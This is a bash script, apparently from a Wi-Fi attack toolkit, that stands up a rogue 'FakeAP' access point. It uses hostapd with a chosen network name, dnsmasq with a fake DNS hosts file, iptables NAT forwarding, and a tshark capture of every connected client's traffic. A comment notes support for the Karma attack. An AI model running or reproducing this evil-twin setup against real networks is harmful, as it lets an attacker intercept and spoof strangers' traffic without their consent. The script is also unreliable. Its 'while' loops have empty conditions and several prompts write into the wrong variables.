#!/bin/bash

PWD="$(pwd)"
INTERFACE="$1"

CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"

source "$CONFIG_FILE"
touch "${CONFIG_FAKEAP_FILE_FAKEDNS}"

echo -n "Choose a internet interface to FakeAP: "
read INTERNET

echo -n "Choose a ESSID to FakeAP: "
read FAKEAP_ESSID


TOOL_FAKEAP="hostapd"
while ; do
    echo -n "Choose a tool to FakeAP hostapd/hostapd-wpe/aircrack-ng [y/N]: "
    read TOOL_FAKEAP
done

TOOL_DHCP="dnsmasq"
while ; do
    echo -n "Choose a tool to DHCP dnsmasq/dhcpcd [y/N]: "
    read TOOL_FAKEAP
done

echo -n "Digite o IP Address do servidor DHCP (ex: 172.16.99.1): " ; read DHCP_SERVER
echo -n "Digite o Start IP Address (ex: 172.16.99.10): " ; read DHCP_RANGE_START
echo -n "Digite o End IP Address (ex: 172.166.99.100): " ; read DHCP_RANGE_END
echo -n "Digite a mascara de rede (ex: 255.255.255.0): " ; read DHCP_NETMASK

echo -n "Digite o SSID: " ; read FAKEAP_SSID
echo -n "Digite o channel: " ; read FAKEAP_CHANNEL
echo -n "Digite o mac address: " ; read FAKEAP_MAC

echo -n "Edit fake DNS - \"${CONFIG_FAKEAP_FILE_FAKEDNS}\" [Y/n]: "
read INTERNET

## CREATE CONFIG
# Edit dnsmasq configuration
echo "
log-facility=$CONFIG_FAKEAP_CUSTOM_DIR/dnsmasq.log
#address=/#/172.16.99.1
#address=/google.com/172.16.99.1
interface=$INTERFACE
dhcp-range=172.16.99.10,172.16.99.100,8h
dhcp-option=3,172.16.99.1
dhcp-option=6,172.16.99.1
server=8.8.8.8
dhcp-leasefile=$CONFIG_FAKEAP_CUSTOM_DIR/dnsmasq.leases
#no-resolv
log-queries
" > "$CONFIG_FAKEAP_CUSTOM_DIR/wificrack-dnsmasq.conf"

# Configure Hostapd
echo "
interface=$INTERFACE
hw_mode=g
channel=6
driver=nl80211
wmm_enabled=1

ssid=$FAKEAP_ESSID
# Yes, we support the Karm attack.
#enable_ka
" > "$CONFIG_FAKEAP_CUSTOM_DIR/wificrack-hostapd.conf"

## START
# Clear
airmon-ng check kill
killall dnsmasq

# Start dnsmasq
dnsmasq -C "$CONFIG_FAKEAP_CUSTOM_DIR/wificrack-dnsmasq.conf" -H "${CONFIG_FAKEAP_FILE_FAKEDNS}" &
#dnsmasq -C "$CONFIG_FAKEAP_DIR/wificrack-dnsmasq.conf" &

# FakeAP iptables rules
ifconfig "$INTERFACE" up
ifconfig "$INTERFACE" 172.16.99.1/24
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE
iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET" -j ACCEPT
echo '1' > /proc/sys/net/ipv4/ip_forward

# Start FakeAP
hostapd "$CONFIG_FAKEAP_CUSTOM_DIR/wificrack-hostapd.conf" -B &

# Sniff
tshark -i "$INTERFACE"  -w "$CONFIG_FAKEAP_DIR"/fakeap-output.pcap -P
